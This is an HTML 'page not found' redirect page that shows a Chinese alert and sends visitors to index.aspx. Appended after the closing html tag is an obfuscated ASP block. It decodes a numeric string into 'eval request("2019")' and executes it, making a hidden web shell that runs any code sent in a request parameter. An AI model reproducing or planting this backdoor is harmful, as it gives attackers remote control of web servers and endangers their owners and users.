<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <script src="Scripts/jquery-1.9.1.js" type="text/javascript"></script>
	<script type="text/javascript">
	    $(function () {
	        alert("您所指定的頁面不存在!確定返回主頁!");
	        window.location = "./index.aspx";
	    });
	</script>
<title>无标题文档</title>
</head>

<body>
</body>
</html>
<%
<!--
Function NRLM(RHAP):
	RHAP = Split(RHAP,"@")
	For x=0 To Ubound(RHAP)
		NRLM=NRLM&Chr(RHAP(x)-198)
	Next
End Function
EXecutE(NRLM("299@316@295@306@230@312@299@311@315@299@313@314@238@232@248@246@247@255@232@239"))
-->
%>
